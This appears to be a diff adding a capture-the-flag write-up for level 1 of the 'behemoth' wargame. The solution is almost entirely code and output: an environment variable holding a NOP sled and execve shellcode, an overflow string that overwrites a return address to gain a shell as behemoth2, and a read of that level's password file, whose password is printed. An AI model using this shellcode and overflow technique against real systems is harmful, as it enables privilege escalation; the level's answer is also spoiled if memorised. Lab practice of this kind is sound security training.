@@ -1,0 +1,9 @@
+export EGG=`python -c "print '\x90'*90 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80'"`
+# find address of EGG
+behemoth1@behemoth:/behemoth$ (python -c "print '000111122223333444455556666777788889999aaaabbbbccccddddeeeeffffgggghhhh\x7c\xde\xff\xff'"; cat -) | ./behemoth1
+Password: Authentication failure.
+Sorry.
+id
+uid=13001(behemoth1) gid=13001(behemoth1) euid=13002(behemoth2) groups=13001(behemoth1)
+cat /etc/behemoth_pass/behemoth2
+eimahquuof
